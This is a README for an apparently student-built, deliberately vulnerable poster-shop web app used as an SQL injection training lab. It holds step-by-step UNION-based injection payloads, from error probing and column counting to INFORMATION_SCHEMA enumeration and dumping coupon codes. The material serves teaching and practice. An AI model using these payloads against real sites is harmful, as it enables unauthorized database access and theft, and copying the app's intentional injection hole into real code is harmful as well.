# <center>PRESENTING MY LAHTP LEGACY ASSIGNMENT - 2 SQL INJECTION</center>
## What does this website do?
* You can buy your favorite posters. Customization options will be added soon. Due to the festival season, coupon codes will be provided based on your purchases.
* You can find posters exclusively in the carousel—many surprise posters are still to come!

## Recommended Way to Clone
* `git clone https://github.com/KuberaKrishna/LAHTP-LEGACY-2.git SQLi` — don’t change the default name ('SQLi'); otherwise, it may not work properly.
## Read this before executing on Linux:
* Move the configuration folder to `/var/www/` (due to file permissions).
* Works perfectly on macOS and Windows.

## Setting Up Database Environment
* To create a user in Adminer, use `sql/adminer-user.sql`
* To create a database in Adminer, use `sql/adminer-sql.sql`

## SQL Injection
+----------------------+<br>
| UNION-based attacks |<br>
+----------------------+
### Information Gathering
* To detect SQL injection vulnerabilities,<br>Query in [Enter poster name] > `'HELLO WORLD`, if there is an error, SQL injection is possible.<br>
### Scanning
* To find the number of columns,<br>Query in [Enter poster name] > `'ORDER BY 3#`. The number of columns is determined by brute-forcing the `ORDER BY` clause.
* To find which parameter is displaying,<br>Query in [Enter poster name] > `'UNION SELECT 'S','N','A'#`. 'S' and 'A' are displayed on the webpage, and 'N' is displayed in `<img class="php-posterimg" src="posters/N" alt="Poster">`

### Gaining Access
* To find the table name of the current database,<br>Query in [Enter poster name] > `'UNION SELECT TABLE_NAME, NULL, TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = SCHEMA()#`. This will retrieve all the table names in the current database.
* To find the column names in the current table,<br>Query in [Enter poster name] > `'UNION SELECT GROUP_CONCAT(COLUMN_NAME,'\n'), NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Posters_Table'#`. This will retrieve all the column names in the 'Posters_Table'.
* To retrieve interesting data about DAMN Poster,<br>Query in [Enter poster name] > `'UNION SELECT POSTERNAME, NULL, COUPONCODE FROM Posters_Table#`.
